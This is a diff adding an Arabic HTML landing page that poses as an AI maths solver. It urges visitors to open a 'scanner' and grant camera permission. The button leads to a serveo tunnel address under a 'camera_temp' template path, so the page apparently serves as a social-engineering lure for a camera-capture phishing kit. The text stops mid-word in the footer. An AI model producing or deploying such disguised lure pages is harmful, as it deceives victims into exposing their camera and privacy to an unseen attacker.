@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Math AI Solver - حل المسائل بالذكاء الاصطناعي</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; text-align: center; padding: 40px 20px; color: #333; }
+        .card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 450px; margin: auto; border: 1px solid #e1e4e8; }
+        .icon { font-size: 60px; margin-bottom: 15px; }
+        h1 { color: #1a73e8; font-size: 26px; margin-bottom: 10px; }
+        p { color: #5f6368; line-height: 1.6; font-size: 16px; }
+        .steps { text-align: right; background: #f8f9fa; padding: 15px; border-radius: 10px; margin: 20px 0; font-size: 14px; }
+        .btn { background-color: #1a73e8; color: white; padding: 16px 32px; border: none; border-radius: 30px; cursor: pointer; font-size: 18px; font-weight: bold; text-decoration: none; display: inline-block; transition: background 0.3s; box-shadow: 0 4px 6px rgba(26,115,232,0.3); }
+        .btn:hover { background-color: #1557b0; }
+        .footer { margin-top: 20px; font-size: 12px; color: #9aa0a6; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="icon">📘</div>
+        <h1>مساعد الرياضيات الذكي</h1>
+        <p>قم بحل أعقد المعادلات الرياضية فوراً باستخدام تقنية المسح الضوئي بالكاميرا.</p>
+        
+        <div class="steps">
+            <strong>كيفية الاستخدام:</strong>
+            <ol>
+                <li>اضغط على زر "فتح الماسح الضوئي" أدناه.</li>
+                <li>قم بإعطاء الإذن للكاميرا للبدء.</li>
+                <li>وجه الكاميرا نحو المسألة وسيظهر الحل فوراً.</li>
+            </ol>
+        </div>
+
+        <a href="https://df60d3cfd9e9535d-105-156-165-6.serveousercontent.com/templates/camera_temp/index.html" class="btn">فتح الماسح الضوئي</a>
+        
+        <div class="footer">مدعوم بتق
